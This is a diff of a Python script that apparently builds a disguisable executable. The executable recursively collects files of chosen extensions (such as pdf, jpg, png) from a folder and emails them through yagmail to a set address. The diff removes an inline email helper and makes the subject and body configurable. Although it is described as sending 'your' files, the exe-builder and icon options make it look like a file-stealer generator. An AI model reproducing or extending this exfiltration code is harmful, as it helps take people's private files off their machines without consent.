@@ -15,24 +15,6 @@ import glob
 import yagmail
 import argparse
 
-def send_email(sender_email, sender_password, receiver_email, subject, body, attachment_path):
-    try:
-        # Create the Yagmail client
-        yag = yagmail.SMTP(sender_email, sender_password)
-
-        # Send the email
-        yag.send(
-            to=receiver_email,
-            subject=subject,
-            contents=body,
-            attachments=attachment_path,
-        )
-        print(f"Email sent successfully to {attachment_path}.")
-        # Close the Yagmail client
-        yag.close()
-    except Exception as e:
-        print(f"An error occurred: {e}")
-
 if __name__ == "__main__":
     # Create an argparse object to handle the arguments
     parser = argparse.ArgumentParser(description="Send files from your computer via email.", add_help=True)
@@ -44,6 +26,8 @@ if __name__ == "__main__":
                         help="The file extensions you want to scan, separated by spaces (e.g., pdf jpg png)")
     parser.add_argument("-n", "--exe-name", required=True, help="The name of the generated exe file.")
     parser.add_argument("-i", "--icon", help="The path to the icon file for the generated exe.")
+    parser.add_argument("--email-subject", required=True, help="The subject of the email.")
+    parser.add_argument("--email-body", required=True, help="The body of the email.")
 
     args = parser.parse_args()
 
@@ -87,8 +71,8 @@ if __name__ == "__main__":
         attachment_files.extend(glob.glob(os.path.join("{args.folder_path}", f"**/*." + extension), recursive=True))
 
     # Define the email subject and body
-    subject = "Your Files Are Attached"
-    body = "Here are your files."
+    subject = "{args.email_subject}"
+    body = "{args.email_body}"
 
     # Complete the email sending process
     for attachment_file in attachment_files:
